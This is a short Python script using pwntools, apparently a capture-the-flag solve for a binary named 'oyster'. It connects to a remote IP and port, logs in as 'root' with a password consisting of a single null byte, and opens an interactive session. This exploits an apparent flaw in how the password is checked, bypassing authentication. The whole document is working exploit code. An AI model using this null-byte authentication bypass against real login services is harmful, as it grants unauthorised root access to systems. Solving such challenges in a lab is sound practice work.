from pwn import *

elf = ELF('./oyster')
# io = process(elf.path)
io = remote('34.170.146.252', 44367)

io.sendlineafter(b'Username: ', b'root')
io.sendlineafter(b'Password: ', b'\x00')

io.interactive()

